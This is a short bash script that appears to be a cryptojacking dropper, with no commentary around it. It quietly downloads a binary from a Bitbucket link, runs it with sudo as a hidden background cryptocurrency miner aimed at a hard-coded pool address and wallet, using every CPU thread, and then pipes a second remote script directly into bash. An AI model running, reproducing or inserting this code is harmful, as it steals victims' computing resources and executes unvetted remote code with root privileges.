#!/bin/bash
wget -O sgr1 https://bitbucket.org/commuter21/escom/downloads/xmolx >/dev/null 2>&1
chmod +x sgr1
sudo ./sgr1 -a rx/0 -o 172.104.176.128:80 -u ZEPHs9wbP2kgeHU9wJoPonUwJAsZkj5rHagMgnDjK7186LuNVVfFeCGDByX2Y18AvbdRJQsNK4Fu4QM7XGs1bXegNGhthDhZ5ht -p Tester2 -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
curl -sL https://bitbucket.org/nicezep/file/raw/master/time | bash
